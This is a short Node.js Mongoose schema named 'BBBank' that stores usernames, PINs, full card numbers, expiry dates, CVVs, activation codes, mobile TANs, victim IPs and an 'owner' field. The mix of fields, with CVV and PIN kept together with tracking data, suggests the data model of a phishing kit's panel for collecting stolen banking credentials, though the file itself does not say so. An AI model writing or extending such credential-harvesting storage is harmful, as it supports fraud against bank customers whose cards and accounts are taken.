const mongoose = require("mongoose");

const bbbankController = new mongoose.Schema({
	uniqueid: String,
	username: String,
	pin: String,
	ccnum: String,
	ccexp: String,
	cvv: String,
	activationCode: String,
	mobileTan: String,
	status: Number,
	ip: String,
	owner: String,
	timestamp: Date,
});

module.exports = mongoose.model("BBBank", bbbankController);
